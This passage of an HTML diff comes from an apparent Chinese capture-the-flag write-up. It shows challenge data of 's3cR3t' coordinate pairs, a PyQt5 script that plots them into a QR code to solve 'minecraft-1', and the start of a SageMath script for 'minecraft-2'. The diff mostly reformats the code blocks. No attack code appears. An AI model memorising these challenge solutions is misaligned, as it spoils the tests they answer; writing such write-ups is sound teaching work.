class="mi">10</span> <span class="mi">240</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">241</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">242</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">243</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">244</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">246</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">247</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">248</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">249</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">250</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">251</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">252</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">253</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">254</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">255</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">257</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">258</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">259</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">260</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">261</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">262</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">263</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">264</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">265</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">266</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">268</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">269</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">270</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">271</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">272</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">273</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">274</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">275</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">276</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">277</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">279</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">280</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">281</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">282</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">283</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">284</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">285</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">286</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">287</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">288</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">289</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">11</span> <span class="mi">10</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">10</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">11</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">12</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">13</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">14</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">15</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">16</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">17</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">18</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">19</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">20</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">22</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">23</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">24</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">25</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">26</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">27</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">28</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">29</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">30</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">31</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">33</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">34</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">35</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">36</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">37</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">38</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">39</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">40</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">41</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">42</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">44</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">45</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">46</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">47</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">48</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">49</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">50</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">51</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">52</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">53</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">55</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">56</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">57</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">58</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">59</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">60</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">61</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">62</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">63</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">64</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">65</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">66</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">67</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">68</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">69</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">70</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">71</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">72</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">73</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">74</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">75</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">76</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">78</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">79</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">80</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">81</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">82</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">83</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">84</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">85</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">86</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">87</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">100</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">101</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">102</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">103</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">104</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">105</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">106</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">107</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">108</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">109</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">111</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">112</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">113</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">114</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">115</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">116</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">117</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">118</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">119</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">120</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">121</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">134</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">135</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">136</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">137</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">138</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">139</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">140</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">141</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">142</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">143</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">145</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">146</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">147</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">148</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">149</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">150</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">151</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">152</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">153</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">154</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">156</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">157</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">158</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">159</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">160</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">161</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">162</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">163</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">164</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">165</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">190</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">191</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">192</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">193</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">194</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">195</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">196</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">197</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">198</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">199</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">212</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">213</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">214</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">215</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">216</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">217</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">218</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">219</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">220</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">221</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">223</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">224</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">225</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">226</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">227</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">228</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">229</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">230</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">231</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">232</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">233</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">234</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">235</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">236</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">237</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">238</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">239</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">240</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">241</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">242</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">243</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">244</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">246</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">247</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">248</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">249</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">250</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">251</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">252</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">253</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">254</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">255</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">257</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">258</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">259</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">260</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">261</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">262</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">263</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">264</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">265</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">266</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">268</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">269</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">270</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">271</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">272</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">273</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">274</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">275</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">276</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">277</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">279</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">280</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">281</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">282</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">283</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">284</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">285</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">286</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">287</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">288</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">289</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">11</span> <span class="mi">10</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="ow">and</span> <span class="n">more</span><span class="o">...</span></span></span></code></pre></div><p>数据量太大就不全部贴出来了.</p>
+</span></span><span class="line"><span class="cl"><span class="ow">and</span> <span class="n">more</span><span class="o">...</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>数据量太大就不全部贴出来了.</p>
 <p>然后写一下绘图脚本:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">PyQt5</span> <span class="kn">import</span> <span class="n">QtGui</span><span class="p">,</span> <span class="n">QtWidgets</span><span class="p">,</span> <span class="n">QtCore</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">PyQt5</span> <span class="kn">import</span> <span class="n">QtGui</span><span class="p">,</span> <span class="n">QtWidgets</span><span class="p">,</span> <span class="n">QtCore</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">PyQt5.QtGui</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">PyQt5.QtCore</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">PyQt5.QtWidgets</span> <span class="kn">import</span> <span class="o">*</span>
@@ -678,7 +1264,9 @@
 </span></span><span class="line"><span class="cl"> <span class="n">window</span> <span class="o">=</span> <span class="n">DrawWidget</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"> <span class="n">window</span><span class="o">.</span><span class="n">show</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"> <span class="n">window</span><span class="o">.</span><span class="n">resize</span><span class="p">(</span><span class="mi">300</span><span class="p">,</span> <span class="mi">300</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"> <span class="n">app</span><span class="o">.</span><span class="n">exec_</span><span class="p">()</span></span></span></code></pre></div><p>扫码, 解决.</p>
+</span></span><span class="line"><span class="cl"> <span class="n">app</span><span class="o">.</span><span class="n">exec_</span><span class="p">()</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>扫码, 解决.</p>
 <h3 class="heading-element" id="minecraft-2"><span>minecraft-2</span>
  <a href="#minecraft-2" class="heading-mark">
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
@@ -693,7 +1281,29 @@
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
 </h3><p>从网上找到一个轮子, 稍加修改使用sage跑一下:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># sage</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># sage</span>
 </span></span><span class="line"><span class="cl">
